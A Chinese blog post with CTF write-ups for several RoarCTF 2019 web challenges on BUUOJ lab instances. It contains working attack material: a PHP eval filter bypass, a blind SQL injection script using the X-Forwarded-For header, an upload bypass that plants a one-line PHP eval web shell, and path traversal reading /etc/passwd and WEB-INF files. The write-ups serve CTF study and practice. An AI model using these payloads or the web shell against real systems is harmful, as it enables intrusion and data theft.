+++
title = "RoarCTF2019"
slug = "roarctf2019"
description = "刷"
date = "2024-08-11T16:42:08"
lastmod = "2024-08-11T16:42:08"
image = ""
license = ""
categories = ["复现"]
tags = []
+++

# [RoarCTF 2019]Easy Calc

查看源码

```html
<!--I've set up WAF to ensure security.-->
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
</script>
```

`/calc.php`

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

首先我们要绕过这句

```
url:"calc.php?num="+encodeURIComponent($("#content").val())

encodeURIComponent除了部分内容,都会被url编码
$("#content")相当于document.getElementById(“content”);
$("#content").val()相当于 document.getElementById(“content”).value;
```

php解析规则为

1. 删除空白符
2. 将某些字符转换为下划线（包括空格)

那么我们如果在`num`前面加一个空格,就无法解析到`num`,然后就绕过了

过滤的命令还是挺多的只能读文件然后读目录了

写个脚本来绕过

```python
str = "/f1agg"
output = ""

for i in str:
    output += "chr({}).".format(ord(i))

output = output[:-1]
print(output)
```

```
http://node5.buuoj.cn:25210/calc.php? num=var_dump(scandir(chr(47)));

http://node5.buuoj.cn:25210/calc.php? num=var_dump(show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));
```

# [RoarCTF 2019]Online Proxy

啥也没有抓包看看

```
<!-- Debug Info: 
 Duration: 0.018837928771973 s 
 Current Ip: 192.168.122.14 
Last Ip: 127.0.0.1 -->
```

发现`Last Ip`可控,如果注入结果为真,那么就有`Last Ip: 1`

这个怎么说,戏称"三次注入"?

先进行`sql注入`,然后随便注入但是不要写`1`或者`0`,知道第三次注入结果若返回为

`Last Ip: 1`,那么sql注入成功,其中`cookie`不能少

写脚本

中途出了一点小意外,但是`debug`就好了

```python 
import requests


url="http://node5.buuoj.cn:26721/"
flag=""
i=0
header={
    "X-Forwarded-For":"",
    "Cookie": "track_uuid=92c3a573-5f45-4388-bfd9-64446845bd7d"
}

# payload= "0' or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),{},1))>{} or '0"

# payload= "0' or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='F4l9_D4t4B45e')),{},1))>{} or '0"

# payload= "0' or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F4l9_t4b1e')),{},1))>{} or '0"

payload= "0' or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),{},1))>{} or '0"

while True:
    i+=1
    high=127
    tail=32

    while tail < high:
        mid=(high+tail)//2
        payload_x=payload.format(i,mid)
        header["X-Forwarded-For"]=payload_x
        #print(header["X-Forwarded-For"])
        r=requests.get(url=url,headers=header)

        header["X-Forwarded-For"]="baozongwi"
        r=requests.get(url=url,headers=header)
        r=requests.get(url=url,headers=header)

        if "Last Ip: 1" in r.text:
            tail=mid+1
        else :
            high=mid
        
    if tail != 32:
        flag+=chr(tail)
    else :
        break
    print("\r"+flag,end="")
```

还要注意的就是有个假`flag`,但是没啥影响

# [RoarCTF 2019]PHPShe

phar反序列化,不是哥们,这东西怎么到处都是,又欠着一道

# [RoarCTF 2019]Simple Upload

```php
<?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
}
```

一个`tp`框架上传漏洞,默认上传路径为`/home/index/upload`

模糊匹配我们直接就上传成功了

```python
import requests
url = "http://f98f5ce4-ead3-4e0a-84aa-82accb68e463.node5.buuoj.cn:81/index.php/home/index/upload/"
s = requests.Session()
files = {"file": ("shell.<>php", "<?php @eval($_POST['a']);?>")}
r = requests.post(url, files=files)
print(r.text)
```

但是不懂为啥直接就给`flag`了

# [RoarCTF 2019]Easy Java

直接用常用密码

```
password=admin888&username=admin
```

但是没啥用

回去F12

```html
<center><p><a href="Download?filename=help.docx" target="_blank">help</a></p></center>
```

```
java.io.FileNotFoundException:{/etc/passwd}

http://3c9543b8-d8b4-439b-8173-8e9bf63e6387.node5.buuoj.cn:81/Download?filename=/etc/passwd
```

这里来了解一些`Java`文件知识

### WEB-INF/web.xml泄露

- WEB-INF主要包含一下文件或目录:
- /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
- /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
- /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
- /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
- /WEB-INF/database.properties：数据库配置文件
- 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码



然后我发现原来`filename`要`POST`传参

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <welcome-file-list>
        <welcome-file>Index</welcome-file>
    </welcome-file-list>

    <servlet>
        <servlet-name>IndexController</servlet-name>
        <servlet-class>com.wm.ctf.IndexController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>IndexController</servlet-name>
        <url-pattern>/Index</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>LoginController</servlet-name>
        <servlet-class>com.wm.ctf.LoginController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>LoginController</servlet-name>
        <url-pattern>/Login</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>DownloadController</servlet-name>
        <servlet-class>com.wm.ctf.DownloadController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>DownloadController</servlet-name>
        <url-pattern>/Download</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>FlagController</servlet-name>
        <url-pattern>/Flag</url-pattern>
    </servlet-mapping>

</web-app>
```

查看`FlagController`

```
http://3c9543b8-d8b4-439b-8173-8e9bf63e6387.node5.buuoj.cn:81/Download
POST:
filename=/WEB-INF/classes/com/wm/ctf/FlagController.class
```

然后可以反编码也可以直接看

```java
package defpackage;

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(name = "FlagController")
/* renamed from: FlagController  reason: default package */
/* loaded from: _WEB-INF_classes_com_wm_ctf_FlagController.class */
public class FlagController extends HttpServlet {
    String flag = "ZmxhZ3tiMDUyZjE3Ni00Y2FmLTRiNzgtYTIzMy03ODhlNTc1YmU4NTV9Cg==";

    protected void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        httpServletResponse.getWriter().print("<h1>Flag is nearby ~ Come on! ! !</h1>");
    }
}
```

# [RoarCTF 2019]Dist

golang的题,并且是SQL注入外加session伪造等等姿势,相当硬
